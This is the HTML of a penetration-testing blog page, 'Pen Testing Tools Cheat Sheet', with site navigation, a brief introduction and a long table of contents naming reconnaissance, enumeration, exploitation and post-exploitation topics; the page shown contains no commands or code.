\<!DOCTYPE HTML\>
<html lang="en-US">
<head>
<meta charset="UTF-8">
`<link rel="canonical" href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">`{=html}
<title>
Pen Testing Tools Cheat Sheet
</title>
<meta name="description" content="Penetration testing tools cheat sheet, a high level overview / quick reference cheat sheet for penetration testing.">
<meta name="viewport" content="width=device-width,initial-scale=1">
`<link rel="alternate" type="application/rss+xml" title="highon.coffee - penentration testing, hacking and coffee" href="/feed.xml">`{=html}
`<!-- <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic,900"> -->`{=html}
`<link rel="stylesheet" type="text/css" href="/css/screen.css">`{=html}
`<!-- <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet"> -->`{=html}
`<link rel="icon" type="image/x-icon" href="/favicon.ico">`{=html}
`<!--[if lt IE 9]>
  <script src="/js/html5shiv.min.js"></script>
  <script src="/js/respond.min.js"></script>
  <![endif]-->`{=html}
`<!-- Place this tag in your head or just before your close body tag. -->`{=html}
`<!--  <script async defer src="https://buttons.github.io/buttons.js"></script> -->`{=html}
</head>
<body class="wrap">
<header>
<nav class="mobile-nav show-on-mobiles">
<ul>
<li class>
`<a href="/">`{=html}Home`</a>`{=html}
</li>
<li class="current">
`<a href="/blog/">`{=html}Blog`</a>`{=html}
</li>
<li class>
`<a href="/about/">`{=html}[About]{.hide-on-mobiles}`</a>`{=html}
</li>
<li class>
`<a href="/services/">`{=html}[Services]{.hide-on-mobiles}`</a>`{=html}
</li>
</ul>
</nav>

::: grid
    <div class="unit one-third center-on-mobiles">
      <h1>
        <a href="/">
          <span>HighOn.Coffee</span>
          <img src="/img/highoncoffee.png" width="300" height="115" alt="Logo">
        </a>
      </h1>
    </div>
    <nav class="main-nav unit two-thirds hide-on-mobiles">
      <ul>

<li class>
`<a href="/">`{=html}Home`</a>`{=html}
</li>
<li class="current">
`<a href="/blog/">`{=html}Blog`</a>`{=html}
</li>
<li class>
`<a href="/about/">`{=html}[About]{.hide-on-mobiles}`</a>`{=html}
</li>
<li class>
`<a href="/services/">`{=html}[Services]{.hide-on-mobiles}`</a>`{=html}
</li>
</ul>

    </nav>
:::

</header>
<section class="blog">

::: grid
      <div class="docs-nav-mobile unit whole show-on-mobiles">

`<select onchange="if (this.value) window.location.href=this.value">`{=html}
`<option value="">`{=html}Navigate the blog...`</option>`{=html}
`<option value="/blog/">`{=html}Home`</option>`{=html}
`<optgroup label="v1.x">`{=html}

      <option value="/blog/katana-cheat-sheet/">Katana Cheat Sheet - Commands, Flags & Examples</option>
      
      <option value="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet: Commands, Flags, Switches & Examples (2024)</option>
      
      <option value="/blog/adb-command-cheat-sheet/">ADB Commands Cheat Sheet - Flags, Switches & Examples Tutorial</option>
      
      <option value="/blog/httpx-cheat-sheet/">httpx Cheat Sheet - Commands & Examples Tutorial</option>
      
      <option value="/blog/sqlmap-cheat-sheet/">SQLMap Cheat Sheet: Flags & Commands for SQL Injection</option>
      
      <option value="/blog/nikto-cheat-sheet/">Nikto Cheat Sheet - Commands & Examples</option>
      
      <option value="/blog/subfinder-cheat-sheet/">Subfinder Cheat Sheet</option>
      
      <option value="/blog/naabu-cheat-sheet/">Naabu Cheat Sheet: Commands & Examples</option>
      
      <option value="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python</option>
      
      <option value="/blog/insecure-direct-object-reference-idor/">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</option>
      
      <option value="/blog/dns-tunnel-dnscat2-cheat-sheet/">DNS Tunneling dnscat2 Cheat Sheet</option>
      
      <option value="/blog/ssh-lateral-movement-cheat-sheet/">SSH Lateral Movement Cheat Sheet</option>
      
      <option value="/blog/android-app-pen-testing-environment/">Android Pen Testing Environment Setup</option>
      
      <option value="/blog/password-reset-security-testing-cheat-sheet/">Password Reset Testing Cheat Sheet</option>
      
      <option value="/blog/ssrf-cheat-sheet/">SSRF Cheat Sheet & Bypass Techniques</option>
      
      <option value="/blog/penetration-testing-tools-cheat-sheet/">Pen Testing Tools Cheat Sheet</option>
      
      <option value="/blog/lfi-cheat-sheet/">LFI Cheat Sheet</option>
      
      <option value="/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</option>
      
      <option value="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</option>
      
      <option value="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</option>
      
      <option value="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</option>
      
      <option value="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</option>
      
      <option value="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</option>
      
      <option value="/blog/sleepy-ctf-walkthrough/">/dev/random: Sleepy Walkthrough CTF</option>
      
      <option value="/blog/pipe-ctf-walkthrough/">/dev/random Pipe walkthrough</option>
      
      <option value="/blog/lord-of-the-root-walkthrough/">Lord of the Root Walkthrough CTF</option>
      
      <option value="/blog/vi-cheat-sheet/">Vim Cheat Sheet [2022 Update] + NEOVIM</option>
      
      <option value="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</option>
      
      <option value="/blog/skytower-walkthrough/">SkyTower - Walkthrough</option>
      
      <option value="/blog/zorz-walkthrough/">Zorz Walkthrough</option>
      
      <option value="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</option>
      
      <option value="/blog/freshly-walkthrough/">Freshly Walkthrough</option>
      
      <option value="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</option>
      
      <option value="/blog/fartknocker-walkthrough/">FartKnocker - Walkthrough</option>
      
      <option value="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</option>
      
      <option value="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet - Commands & Examples</option>
      
      <option value="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</option>
      
      <option value="/blog/security-harden-centos-7/">Security Harden CentOS 7</option>
      
      <option value="/blog/ssh-meterpreter-pivoting-techniques/">SSH & Meterpreter Pivoting Techniques</option>
      
      <option value="/blog/sokar-walkthrough/">Sokar - Walkthrough</option>
      
      <option value="/blog/tr0ll-2-walkthrough/">Tr0ll 2 Walkthrough</option>
      
      <option value="/blog/tr0ll-1-walkthrough/">Tr0ll 1 Walkthrough</option>
      
      <option value="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</option>
      
      <option value="/blog/shellshock-pen-testers-lab-walkthrough/">Pen Testers Lab: Shellshock CVE-2014-6271 - Walkthrough</option>
      
      <option value="/blog/lamp-security-ctf8-walkthrough/">LAMP Security CTF8 - Walkthrough</option>
      
      <option value="/blog/kioptrix-level-2014-walkthrough/">Kioptrix Level 2014 Walkthrough</option>
      
      <option value="/blog/lamp-security-ctf7-walkthrough/">LAMP Security CTF7 - Walkthrough</option>
      
      <option value="/blog/lamp-security-ctf6-walkthrough/">LAMP Security CTF6 - Walkthrough</option>
      
      <option value="/blog/lamp-security-ctf5-walkthrough/">LAMP Security CTF5 - Walkthrough</option>
      
      <option value="/blog/lamp-security-ctf4-walkthrough/">LAMP Security CTF4 - Walkthrough</option>
      
      <option value="/blog/kioptrix-level-1-2-walkthrough/">Kioptrix Level 1.2 Walkthrough</option>
      
      <option value="/blog/kioptrix-level-1-1-walkthrough/">Kioptrix Level 1.1 Walkthrough</option>
      
      <option value="/blog/kioptrix-level-1-walkthrough/">Kioptrix Level 1 Walkthrough</option>
      
    </optgroup>

`</select>`{=html}
:::

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: {.unit .four-fifths}
        <article>

<h2>
Pen Testing Tools Cheat Sheet
`<a href="/blog/penetration-testing-tools-cheat-sheet/" class="permalink" title="Permalink">`{=html}∞`</a>`{=html}
</h2>
[ [ cheat-sheet ]{.label} ]{.post-category}

::: post-meta
    <span class="post-date">
      16 Mar 2020
    </span>
    <a href="https://twitter.com/Arr0way" class="post-author">
      <img src="https://github.com/Arr0way.png" class="avatar" alt="Arr0way" width="24" height="24">
      Arr0way
    </a>
:::

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: post-content
    <h2 id="introduction">Introduction</h2>

<p>
`<strong>`{=html}Penetration Testing Tools Cheat Sheet`</strong>`{=html}
-- a quick-reference, high-level overview for typical penetration
testing engagements. This cheat sheet is intended as a concise guide to
the common commands used during a penetration test. For more detailed
information, I recommend consulting the tool's manual page (man file),
or a more specific penetration testing cheat sheet from the menu on the
right.
</p>
<p>
The primary focus here is on infrastructure and network penetration
testing;
`<a href="https://www.aptive.co.uk/penetration-testing/">`{=html}web
application`</a>`{=html} security testing is not covered in detail here,
aside from a few `<a href="/blog/sqlmap-cheat-sheet/">`{=html}SQLMap
commands`</a>`{=html} towards the end and some basic web server
enumeration. For comprehensive guidance on Web Application Penetration
Testing, The Web Application Hacker's Handbook is an excellent resource
for both learning and reference.
</p>
<p>
If any pen testing tools are missing here, give me a nudge on twitter
@Arr0way
</p>
<ul id="markdown-toc">
<li>
`<a href="#introduction" id="markdown-toc-introduction">`{=html}Introduction`</a>`{=html}
</li>
<li>
`<a href="#pre-engagement" id="markdown-toc-pre-engagement">`{=html}Pre-engagement`</a>`{=html}
<ul>
<li>
`<a href="#network-configuration" id="markdown-toc-network-configuration">`{=html}Network
Configuration`</a>`{=html}
<ul>
<li>
`<a href="#set-ip-address" id="markdown-toc-set-ip-address">`{=html}Set
IP Address`</a>`{=html}
</li>
<li>
`<a href="#subnetting" id="markdown-toc-subnetting">`{=html}Subnetting`</a>`{=html}
</li>
</ul>

      </li>
    </ul>

</li>
<li>
`<a href="#osint" id="markdown-toc-osint">`{=html}OSINT`</a>`{=html}
<ul>
<li>
`<a href="#passive-information-gathering" id="markdown-toc-passive-information-gathering">`{=html}Passive
Information Gathering`</a>`{=html}
<ul>
<li>
`<a href="#dns" id="markdown-toc-dns">`{=html}DNS`</a>`{=html}
<ul>
<li>
`<a href="#whois-enumeration" id="markdown-toc-whois-enumeration">`{=html}WHOIS
enumeration`</a>`{=html}
</li>
<li>
`<a href="#perform-dns-ip-lookup" id="markdown-toc-perform-dns-ip-lookup">`{=html}Perform
DNS IP Lookup`</a>`{=html}
</li>
<li>
`<a href="#perform-mx-record-lookup" id="markdown-toc-perform-mx-record-lookup">`{=html}Perform
MX Record Lookup`</a>`{=html}
</li>
<li>
`<a href="#perform-zone-transfer-with-dig" id="markdown-toc-perform-zone-transfer-with-dig">`{=html}Perform
Zone Transfer with DIG`</a>`{=html}
</li>
</ul>

          </li>
        </ul>
      </li>
    </ul>

</li>
<li>
`<a href="#dns-zone-transfers" id="markdown-toc-dns-zone-transfers">`{=html}DNS
Zone Transfers`</a>`{=html}
<ul>
<li>
`<a href="#email" id="markdown-toc-email">`{=html}Email`</a>`{=html}
<ul>
<li>
`<a href="#simply-email" id="markdown-toc-simply-email">`{=html}Simply
Email`</a>`{=html}
</li>
</ul>

      </li>
      <li><a href="#semi-active-information-gathering" id="markdown-toc-semi-active-information-gathering">Semi Active Information Gathering</a>        <ul>
          <li><a href="#basic-finger-printing" id="markdown-toc-basic-finger-printing">Basic Finger Printing</a></li>
          <li><a href="#banner-grabbing-with-nc" id="markdown-toc-banner-grabbing-with-nc">Banner grabbing with NC</a></li>
        </ul>
      </li>
      <li><a href="#active-information-gathering" id="markdown-toc-active-information-gathering">Active Information Gathering</a>        <ul>
          <li><a href="#dns-bruteforce" id="markdown-toc-dns-bruteforce">DNS Bruteforce</a>            <ul>
              <li><a href="#dnsrecon" id="markdown-toc-dnsrecon">DNSRecon</a></li>
            </ul>
          </li>
          <li><a href="#port-scanning" id="markdown-toc-port-scanning">Port Scanning</a>            <ul>
              <li><a href="#nmap-commands" id="markdown-toc-nmap-commands">Nmap Commands</a>                <ul>
                  <li><a href="#nmap-udp-scanning" id="markdown-toc-nmap-udp-scanning">Nmap UDP Scanning</a></li>
                  <li><a href="#udp-protocol-scanner" id="markdown-toc-udp-protocol-scanner">UDP Protocol Scanner</a></li>
                  <li><a href="#other-host-discovery" id="markdown-toc-other-host-discovery">Other Host Discovery</a></li>
                </ul>
              </li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>

</li>
<li>
`<a href="#enumeration--attacking-network-services" id="markdown-toc-enumeration--attacking-network-services">`{=html}Enumeration
& Attacking Network Services`</a>`{=html}
<ul>
<li>
`<a href="#samb--smb--windows-domain-enumeration" id="markdown-toc-samb--smb--windows-domain-enumeration">`{=html}SAMB
/ SMB / Windows Domain Enumeration`</a>`{=html}
<ul>
<li>
`<a href="#samba-enumeration" id="markdown-toc-samba-enumeration">`{=html}Samba
Enumeration`</a>`{=html}
<ul>
<li>
`<a href="#smb-enumeration-tools" id="markdown-toc-smb-enumeration-tools">`{=html}SMB
Enumeration Tools`</a>`{=html}
</li>
<li>
`<a href="#fingerprint-smb-version" id="markdown-toc-fingerprint-smb-version">`{=html}Fingerprint
SMB Version`</a>`{=html}
</li>
<li>
`<a href="#find-open-smb-shares" id="markdown-toc-find-open-smb-shares">`{=html}Find
open SMB Shares`</a>`{=html}
</li>
<li>
`<a href="#enumerate-smb-users" id="markdown-toc-enumerate-smb-users">`{=html}Enumerate
SMB Users`</a>`{=html}
</li>
<li>
`<a href="#manual-null-session-testing" id="markdown-toc-manual-null-session-testing">`{=html}Manual
Null session testing:`</a>`{=html}
</li>
<li>
`<a href="#nbtscan-unixwiz" id="markdown-toc-nbtscan-unixwiz">`{=html}NBTScan
unixwiz`</a>`{=html}
</li>
</ul>

          </li>
        </ul>
      </li>
      <li><a href="#llmnr--nbt-ns-spoofing" id="markdown-toc-llmnr--nbt-ns-spoofing">LLMNR / NBT-NS Spoofing</a>        <ul>
          <li><a href="#metasploit-llmnr--netbios-requests" id="markdown-toc-metasploit-llmnr--netbios-requests">Metasploit LLMNR / NetBIOS requests</a></li>
          <li><a href="#responderpy" id="markdown-toc-responderpy">Responder.py</a></li>
        </ul>
      </li>
      <li><a href="#snmp-enumeration-tools" id="markdown-toc-snmp-enumeration-tools">SNMP Enumeration Tools</a>        <ul>
          <li><a href="#snmpv3-enumeration-tools" id="markdown-toc-snmpv3-enumeration-tools">SNMPv3 Enumeration Tools</a></li>
        </ul>
      </li>
      <li><a href="#r-services-enumeration" id="markdown-toc-r-services-enumeration">R Services Enumeration</a>        <ul>
          <li><a href="#rsh-enumeration" id="markdown-toc-rsh-enumeration">RSH Enumeration</a>            <ul>
              <li><a href="#rsh-run-commands" id="markdown-toc-rsh-run-commands">RSH Run Commands</a></li>
              <li><a href="#metasploit-rsh-login-scanner" id="markdown-toc-metasploit-rsh-login-scanner">Metasploit RSH Login Scanner</a></li>
              <li><a href="#rusers-show-logged-in-users" id="markdown-toc-rusers-show-logged-in-users">rusers Show Logged in Users</a></li>
              <li><a href="#rusers-scan-whole-subnet" id="markdown-toc-rusers-scan-whole-subnet">rusers scan whole Subnet</a></li>
            </ul>
          </li>
        </ul>
      </li>
      <li><a href="#finger-enumeration" id="markdown-toc-finger-enumeration">Finger Enumeration</a>        <ul>
          <li><a href="#finger-a-specific-username" id="markdown-toc-finger-a-specific-username">Finger a Specific Username</a></li>
          <li><a href="#solaris-bug-that-shows-all-logged-in-users" id="markdown-toc-solaris-bug-that-shows-all-logged-in-users">Solaris bug that shows all logged in users:</a></li>
        </ul>
      </li>
      <li><a href="#rwho" id="markdown-toc-rwho">rwho</a></li>
    </ul>

</li>
<li>
`<a href="#tls--ssl-testing" id="markdown-toc-tls--ssl-testing">`{=html}TLS
& SSL Testing`</a>`{=html}
<ul>
<li>
`<a href="#testsslsh" id="markdown-toc-testsslsh">`{=html}testssl.sh`</a>`{=html}
</li>
</ul>
</li>
<li>
`<a href="#vulnerability-assessment" id="markdown-toc-vulnerability-assessment">`{=html}Vulnerability
Assessment`</a>`{=html}
</li>
<li>
`<a href="#database-penetration-testing" id="markdown-toc-database-penetration-testing">`{=html}Database
Penetration Testing`</a>`{=html}
<ul>
<li>
`<a href="#oracle" id="markdown-toc-oracle">`{=html}Oracle`</a>`{=html}
<ul>
<li>
`<a href="#fingerprint-oracle-tns-version" id="markdown-toc-fingerprint-oracle-tns-version">`{=html}Fingerprint
Oracle TNS Version`</a>`{=html}
</li>
<li>
`<a href="#brute-force-oracle-user-accounts" id="markdown-toc-brute-force-oracle-user-accounts">`{=html}Brute
force oracle user accounts`</a>`{=html}
</li>
<li>
`<a href="#oracle-privilege-escalation" id="markdown-toc-oracle-privilege-escalation">`{=html}Oracle
Privilege Escalation`</a>`{=html}
<ul>
<li>
`<a href="#identify-default-accounts-within-oracle-db-using-nmap-nse-scripts" id="markdown-toc-identify-default-accounts-within-oracle-db-using-nmap-nse-scripts">`{=html}Identify
default accounts within oracle db using NMAP NSE scripts:`</a>`{=html}
</li>
<li>
`<a href="#how-to-identify-the-current-privilege-level-for-an-oracle-user" id="markdown-toc-how-to-identify-the-current-privilege-level-for-an-oracle-user">`{=html}How
to identify the current privilege level for an oracle user:`</a>`{=html}
</li>
<li>
`<a href="#oracle-priv-esc-and-obtain-dba-access" id="markdown-toc-oracle-priv-esc-and-obtain-dba-access">`{=html}Oracle
priv esc and obtain DBA access:`</a>`{=html}
</li>
<li>
`<a href="#run-the-exploit-with-a-select-query" id="markdown-toc-run-the-exploit-with-a-select-query">`{=html}Run
the exploit with a select query:`</a>`{=html}
</li>
<li>
`<a href="#remove-the-exploit-using" id="markdown-toc-remove-the-exploit-using">`{=html}Remove
the exploit using:`</a>`{=html}
</li>
<li>
`<a href="#get-oracle-reverse-os-shell" id="markdown-toc-get-oracle-reverse-os-shell">`{=html}Get
Oracle Reverse os-shell:`</a>`{=html}
</li>
</ul>

          </li>
        </ul>
      </li>
      <li><a href="#mssql" id="markdown-toc-mssql">MSSQL</a>        <ul>
          <li><a href="#bruteforce-mssql-login" id="markdown-toc-bruteforce-mssql-login">Bruteforce MSSQL Login</a></li>
          <li><a href="#metasploit-mssql-shell" id="markdown-toc-metasploit-mssql-shell">Metasploit MSSQL Shell</a></li>
        </ul>
      </li>
    </ul>

</li>
<li>
`<a href="#network" id="markdown-toc-network">`{=html}Network`</a>`{=html}
<ul>
<li>
`<a href="#plinkexe-tunnel" id="markdown-toc-plinkexe-tunnel">`{=html}Plink.exe
Tunnel`</a>`{=html}
</li>
<li>
`<a href="#pivoting" id="markdown-toc-pivoting">`{=html}Pivoting`</a>`{=html}
<ul>
<li>
`<a href="#ssh-pivoting" id="markdown-toc-ssh-pivoting">`{=html}SSH
Pivoting`</a>`{=html}
</li>
<li>
`<a href="#meterpreter-pivoting" id="markdown-toc-meterpreter-pivoting">`{=html}Meterpreter
Pivoting`</a>`{=html}
</li>
</ul>

      </li>
      <li><a href="#ttl-finger-printing" id="markdown-toc-ttl-finger-printing">TTL Finger Printing</a></li>
      <li><a href="#ipv4-cheat-sheets" id="markdown-toc-ipv4-cheat-sheets">IPv4 Cheat Sheets</a>        <ul>
          <li><a href="#classful-ip-ranges" id="markdown-toc-classful-ip-ranges">Classful IP Ranges</a></li>
          <li><a href="#ipv4-private-address-ranges" id="markdown-toc-ipv4-private-address-ranges">IPv4 Private Address Ranges</a></li>
          <li><a href="#ipv4-subnet-cheat-sheet" id="markdown-toc-ipv4-subnet-cheat-sheet">IPv4 Subnet Cheat Sheet</a></li>
        </ul>
      </li>
      <li><a href="#vlan-hopping" id="markdown-toc-vlan-hopping">VLAN Hopping</a></li>
      <li><a href="#vpn-pentesting-tools" id="markdown-toc-vpn-pentesting-tools">VPN Pentesting Tools</a>        <ul>
          <li><a href="#ikeforce" id="markdown-toc-ikeforce">IKEForce</a></li>
          <li><a href="#ike-aggressive-mode-psk-cracking" id="markdown-toc-ike-aggressive-mode-psk-cracking">IKE Aggressive Mode PSK Cracking</a>            <ul>
              <li><a href="#step-1-idenitfy-ike-servers" id="markdown-toc-step-1-idenitfy-ike-servers">Step 1: Idenitfy IKE Servers</a></li>
              <li><a href="#step-2-enumerate-group-name-with-ikeforce" id="markdown-toc-step-2-enumerate-group-name-with-ikeforce">Step 2: Enumerate group name with IKEForce</a></li>
              <li><a href="#step-3-use-ike-scan-to-capture-the-psk-hash" id="markdown-toc-step-3-use-ike-scan-to-capture-the-psk-hash">Step 3: Use ike-scan to capture the PSK hash</a></li>
              <li><a href="#step-4-use-psk-crack-to-crack-the-psk-hash" id="markdown-toc-step-4-use-psk-crack-to-crack-the-psk-hash">Step 4: Use psk-crack to crack the PSK hash</a></li>
            </ul>
          </li>
          <li><a href="#pptp-hacking" id="markdown-toc-pptp-hacking">PPTP Hacking</a>            <ul>
              <li><a href="#nmap-pptp-fingerprint" id="markdown-toc-nmap-pptp-fingerprint">NMAP PPTP Fingerprint:</a></li>
              <li><a href="#pptp-dictionary-attack" id="markdown-toc-pptp-dictionary-attack">PPTP Dictionary Attack</a></li>
            </ul>
          </li>
        </ul>
      </li>
      <li><a href="#dns-tunneling" id="markdown-toc-dns-tunneling">DNS Tunneling</a>        <ul>
          <li><a href="#attacking-machine" id="markdown-toc-attacking-machine">Attacking Machine</a></li>
        </ul>
      </li>
    </ul>

</li>
<li>
`<a href="#bof--exploit" id="markdown-toc-bof--exploit">`{=html}BOF /
Exploit`</a>`{=html}
</li>
<li>
`<a href="#exploit-research" id="markdown-toc-exploit-research">`{=html}Exploit
Research`</a>`{=html}
<ul>
<li>
`<a href="#searching-for-exploits" id="markdown-toc-searching-for-exploits">`{=html}Searching
for Exploits`</a>`{=html}
</li>
<li>
`<a href="#compiling-windows-exploits-on-kali" id="markdown-toc-compiling-windows-exploits-on-kali">`{=html}Compiling
Windows Exploits on Kali`</a>`{=html}
</li>
<li>
`<a href="#cross-compiling-exploits" id="markdown-toc-cross-compiling-exploits">`{=html}Cross
Compiling Exploits`</a>`{=html}
</li>
<li>
`<a href="#exploiting-common-vulnerabilities" id="markdown-toc-exploiting-common-vulnerabilities">`{=html}Exploiting
Common Vulnerabilities`</a>`{=html}
<ul>
<li>
`<a href="#exploiting-shellshock" id="markdown-toc-exploiting-shellshock">`{=html}Exploiting
Shellshock`</a>`{=html}
<ul>
<li>
`<a href="#cat-file-view-file-contents" id="markdown-toc-cat-file-view-file-contents">`{=html}cat
file (view file contents)`</a>`{=html}
</li>
<li>
`<a href="#shell-shock-run-bind-shell" id="markdown-toc-shell-shock-run-bind-shell">`{=html}Shell
Shock run bind shell`</a>`{=html}
</li>
<li>
`<a href="#shell-shock-reverse-shell" id="markdown-toc-shell-shock-reverse-shell">`{=html}Shell
Shock reverse Shell`</a>`{=html}
</li>
</ul>

          </li>
        </ul>
      </li>
    </ul>

</li>
<li>
`<a href="#simple-local-web-servers" id="markdown-toc-simple-local-web-servers">`{=html}Simple
Local Web Servers`</a>`{=html}
</li>
<li>
`<a href="#mounting-file-shares" id="markdown-toc-mounting-file-shares">`{=html}Mounting
File Shares`</a>`{=html}
</li>
<li>
`<a href="#http--https-webserver-enumeration" id="markdown-toc-http--https-webserver-enumeration">`{=html}HTTP
/ HTTPS Webserver Enumeration`</a>`{=html}
</li>
<li>
`<a href="#packet-inspection" id="markdown-toc-packet-inspection">`{=html}Packet
Inspection`</a>`{=html}
</li>
<li>
`<a href="#username-enumeration" id="markdown-toc-username-enumeration">`{=html}Username
Enumeration`</a>`{=html}
<ul>
<li>
`<a href="#smb-user-enumeration" id="markdown-toc-smb-user-enumeration">`{=html}SMB
User Enumeration`</a>`{=html}
</li>
<li>
`<a href="#snmp-user-enumeration" id="markdown-toc-snmp-user-enumeration">`{=html}SNMP
User Enumeration`</a>`{=html}
</li>
</ul>
</li>
<li>
`<a href="#passwords" id="markdown-toc-passwords">`{=html}Passwords`</a>`{=html}
<ul>
<li>
`<a href="#wordlists" id="markdown-toc-wordlists">`{=html}Wordlists`</a>`{=html}
</li>
</ul>
</li>
<li>
`<a href="#brute-forcing-services" id="markdown-toc-brute-forcing-services">`{=html}Brute
Forcing Services`</a>`{=html}
<ul>
<li>
`<a href="#hydra-ftp-brute-force" id="markdown-toc-hydra-ftp-brute-force">`{=html}Hydra
FTP Brute Force`</a>`{=html}
</li>
<li>
`<a href="#hydra-pop3-brute-force" id="markdown-toc-hydra-pop3-brute-force">`{=html}Hydra
POP3 Brute Force`</a>`{=html}
</li>
<li>
`<a href="#hydra-smtp-brute-force" id="markdown-toc-hydra-smtp-brute-force">`{=html}Hydra
SMTP Brute Force`</a>`{=html}
</li>
</ul>
</li>
<li>
`<a href="#password-cracking" id="markdown-toc-password-cracking">`{=html}Password
Cracking`</a>`{=html}
<ul>
<li>
`<a href="#john-the-ripper---jtr" id="markdown-toc-john-the-ripper---jtr">`{=html}John
The Ripper - JTR`</a>`{=html}
</li>
</ul>
</li>
<li>
`<a href="#windows-penetration-testing-commands" id="markdown-toc-windows-penetration-testing-commands">`{=html}Windows
Penetration Testing Commands`</a>`{=html}
</li>
<li>
`<a href="#linux-penetration-testing-commands" id="markdown-toc-linux-penetration-testing-commands">`{=html}Linux
Penetration Testing Commands`</a>`{=html}
</li>
<li>
`<a href="#compiling-exploits" id="markdown-toc-compiling-exploits">`{=html}Compiling
Exploits`</a>`{=html}
<ul>
<li>
`<a href="#identifying-if-c-code-is-for-windows-or-linux" id="markdown-toc-identifying-if-c-code-is-for-windows-or-linux">`{=html}Identifying
if C code is for Windows or Linux`</a>`{=html}
</li>
<li>
`<a href="#build-exploit-gcc" id="markdown-toc-build-exploit-gcc">`{=html}Build
Exploit GCC`</a>`{=html}
</li>
<li>
`<a href="#gcc-compile-32bit-exploit-on-64bit-kali" id="markdown-toc-gcc-compile-32bit-exploit-on-64bit-kali">`{=html}GCC
Compile 32Bit Exploit on 64Bit Kali`</a>`{=html}
</li>
<li>
`<a href="#compile-windows-exe-on-linux" id="markdown-toc-compile-windows-exe-on-linux">`{=html}Compile
Windows .exe on Linux`</a>`{=html}
</li>
</ul>
</li>
<li>
`<a href="#suid-binary" id="markdown-toc-suid-binary">`{=html}SUID
Binary`</a>`{=html}
<ul>
<li>
`<a href="#suid-c-shell-for-binbash" id="markdown-toc-suid-c-shell-for-binbash">`{=html}SUID
C Shell for /bin/bash`</a>`{=html}
</li>
<li>
`<a href="#suid-c-shell-for-binsh" id="markdown-toc-suid-c-shell-for-binsh">`{=html}SUID
C Shell for /bin/sh`</a>`{=html}
</li>
<li>
`<a href="#building-the-suid-shell-binary" id="markdown-toc-building-the-suid-shell-binary">`{=html}Building
the SUID Shell binary`</a>`{=html}
</li>
</ul>
</li>
<li>
`<a href="#reverse-shells" id="markdown-toc-reverse-shells">`{=html}Reverse
Shells`</a>`{=html}
</li>
<li>
`<a href="#tty-shells" id="markdown-toc-tty-shells">`{=html}TTY
Shells`</a>`{=html}
<ul>
<li>
`<a href="#python-tty-shell-trick" id="markdown-toc-python-tty-shell-trick">`{=html}Python
TTY Shell Trick`</a>`{=html}
</li>
<li>
`<a href="#spawn-interactive-sh-shell" id="markdown-toc-spawn-interactive-sh-shell">`{=html}Spawn
Interactive sh shell`</a>`{=html}
</li>
<li>
`<a href="#spawn-perl-tty-shell" id="markdown-toc-spawn-perl-tty-shell">`{=html}Spawn
Perl TTY Shell`</a>`{=html}
</li>
<li>
`<a href="#spawn-ruby-tty-shell" id="markdown-toc-spawn-ruby-tty-shell">`{=html}Spawn
Ruby TTY Shell`</a>`{=html}
</li>
<li>
`<a href="#spawn-lua-tty-shell" id="markdown-toc-spawn-lua-tty-shell">`{=html}Spawn
Lua TTY Shell`</a>`{=html}
</li>
<li>
`<a href="#spawn-tty-shell-from-vi" id="markdown-toc-spawn-tty-shell-from-vi">`{=html}Spawn
TTY Shell from Vi`</a>`{=html}
</li>
<li>
`<a href="#spawn-tty-shell-nmap" id="markdown-toc-spawn-tty-shell-nmap">`{=html}Spawn
TTY Shell NMAP`</a>`{=html}
</li>
</ul>
</li>
<li>
`<a href="#metasploit-cheat-sheet" id="markdown-toc-metasploit-cheat-sheet">`{=html}Metasploit
Cheat Sheet`</a>`{=html}
<ul>
<li>
`<a href="#meterpreter-payloads" id="markdown-toc-meterpreter-payloads">`{=html}Meterpreter
Payloads`</a>`{=html}
</li>
<li>
`<a href="#windows-reverse-meterpreter-payload" id="markdown-toc-windows-reverse-meterpreter-payload">`{=html}Windows
reverse meterpreter payload`</a>`{=html}
</li>
<li>
`<a href="#windows-vnc-meterpreter-payload" id="markdown-toc-windows-vnc-meterpreter-payload">`{=html}Windows
VNC Meterpreter payload`</a>`{=html}
</li>
<li>
`<a href="#linux-reverse-meterpreter-payload" id="markdown-toc-linux-reverse-meterpreter-payload">`{=html}Linux
Reverse Meterpreter payload`</a>`{=html}
</li>
</ul>
</li>
<li>
`<a href="#meterpreter-cheat-sheet" id="markdown-toc-meterpreter-cheat-sheet">`{=html}Meterpreter
Cheat Sheet`</a>`{=html}
</li>
<li>
`<a href="#common-metasploit-modules" id="markdown-toc-common-metasploit-modules">`{=html}Common
Metasploit Modules`</a>`{=html}
<ul>
<li>
`<a href="#remote-windows-metasploit-modules-exploits" id="markdown-toc-remote-windows-metasploit-modules-exploits">`{=html}Remote
Windows Metasploit Modules (exploits)`</a>`{=html}
</li>
<li>
